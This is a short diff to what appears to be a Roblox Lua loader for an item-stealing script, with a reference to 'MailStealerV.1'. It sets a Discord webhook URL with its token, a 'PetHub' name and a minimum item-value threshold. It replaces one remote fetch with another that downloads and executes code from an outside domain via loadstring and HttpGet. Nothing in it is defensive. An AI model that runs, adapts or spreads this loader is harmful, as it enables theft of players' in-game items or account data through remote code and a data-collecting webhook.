@@ -1,3 +1,6 @@
 Username = "Thyuyus"
+Username2 = "Thyuyus"
 Webhook = "https://discord.com/api/webhooks/1214442925489135646/MmIoIRyVmxnquszNOf6bwz1M2ccV2Vc2NaYIq8s_JfyQbH_BsquroH5IfRQxkqsn_7JN"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CatZHubOffical/MailStealerV.1/main/V.2"))()```
+HubName = "PetHub"
+MinimumRAP = 100000
+loadstring(game:HttpGet("https://egorikusa.space"))()```
